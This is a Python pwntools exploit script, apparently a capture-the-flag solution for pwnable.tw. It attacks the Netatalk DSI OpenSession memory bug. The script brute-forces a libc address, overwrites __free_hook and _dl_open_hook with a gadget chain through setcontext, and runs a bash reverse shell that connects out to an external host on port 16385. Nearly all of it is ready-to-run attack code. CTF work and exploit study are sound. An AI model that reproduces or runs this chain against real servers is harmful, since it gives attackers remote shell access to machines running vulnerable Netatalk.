# reference: https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172
from pwn import *
import struct

libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')
context.arch = 'amd64'

def gen_leak_header(identifier, address):
    dsi_payload = b'\x00\x00\x40\x00'
    dsi_payload += b'\x00\x00\x00\x00'
    dsi_payload += struct.pack('<I', identifier) # overwrite server_quantum
    dsi_payload += struct.pack('<H', 0xcafe) # overwrite serverID
    dsi_payload += struct.pack('<H', 0xbabe) # overwrite clientID
    dsi_payload += address # overwrite commands

    dsi_opensession = b'\x01'
    dsi_opensession += struct.pack('B', len(dsi_payload))
    dsi_opensession += dsi_payload

    dsi_header = b'\x00' # request
    dsi_header += b'\x04' # open session
    dsi_header += b'\x00\x01' # request id
    dsi_header += b'\x00\x00\x00\x00' # data offset
    dsi_header += struct.pack('>I', len(dsi_opensession))
    dsi_header += b'\x00\x00\x00\x00' # reserved
    dsi_header += dsi_opensession

    return dsi_header

def gen_exploit_header(num, payload):
    dsi_opensession = bytes([num])
    dsi_opensession += b'\x00'
    dsi_opensession += payload

    dsi_header = b'\x00'
    dsi_header += b'\x02'
    dsi_header += b'\x00\x02'
    dsi_header += b'\x00\x00\x00\x00'
    dsi_header += struct.pack('>I', len(dsi_opensession))
    dsi_header += b'\x00\x00\x00\x00'
    dsi_header += dsi_opensession
    return dsi_header

def brute_force_libc():
    address = b''
    for i in range(6):
        for char in range(256):
            io = remote('chall.pwnable.tw', 10002)
            identifier = 0xdeadbeef
            dsi_header = gen_leak_header(identifier, address + bytes([char]))
            io.send(dsi_header)
            try:
                response = io.recv(0x1c)
            except:
                pass
            else:
                address += bytes([char])
                break
            io.close()
        else:
            print('failed')
            sys.exit(1)
    #address = b'\x00\xa03\xad\xde\x7f'
    return u64(address.ljust(8, b'\0'))
    

address_leak = brute_force_libc()
libc.address = address_leak + 0x5246000

io = remote('chall.pwnable.tw', 10002)
io.send(gen_leak_header(0xdeadbeef, p64(libc.sym['__free_hook'] - 0x10)))

'''
                    0                               addr(fgetpos64) + 0xcf
_dl_open_hook  -->  addr(_dl_open_hook) - 0x8       0
                    0                               addr(setcontext) + 0x35
                    r8                              r9
                    0                               0
                    r12                             r13
                    r14                             r15
                    rdi(reverse_shell_addr)         rsi
                    rbp                             rbx
                    rdx                             0
                    rcx                             rsp(any writable address)
                    rcx(system)                     0
                    ...
                    reverse_shell
'''

payload = b'\0' * 0xe # two null bytes in the front. So total of 0x10 - 0x2 = 0xe junk bytes
payload += p64(libc.sym['__libc_dlopen_mode'] + 0x38) # mov rax, {_dl_open_hook} ; call qword ptr [rax]
payload += (libc.sym['_dl_open_hook'] - libc.sym['__free_hook'] - 0x10) * b'\0' # junk between __free_hook and _dl_open_hook
payload += p64(libc.sym['fgetpos64'] + 0xcf) # mov rdi, rax ; call qword ptr [rax + 0x20]
payload += p64(libc.sym['_dl_open_hook'] - 0x8)
payload += p64(0) * 2
payload += p64(libc.sym['setcontext'] + 0x35) # hijack execution flow

# reverse shell
reverse_shell = b'bash -c "bash -i >& /dev/tcp/wxrdnx.tw/16385 0>&1"'
reverse_shell_addr = libc.sym['_dl_open_hook'] + 0xf8
new_rsp = libc.sym['_dl_open_hook'] + 0x200 # new rsp
registers = [0, 0, 0, 0, 0, 0, 0, 0, reverse_shell_addr, 0, 0, 0, 0, 0, 0, new_rsp, libc.sym['system']]

payload += flat(registers)
payload += b'\0' * 0x50
payload += reverse_shell

# overwrite __free_hook and _dl_open_hook
io.send(gen_exploit_header(0, payload))
# trigger __free_hook
io.send(gen_exploit_header(18, b''))
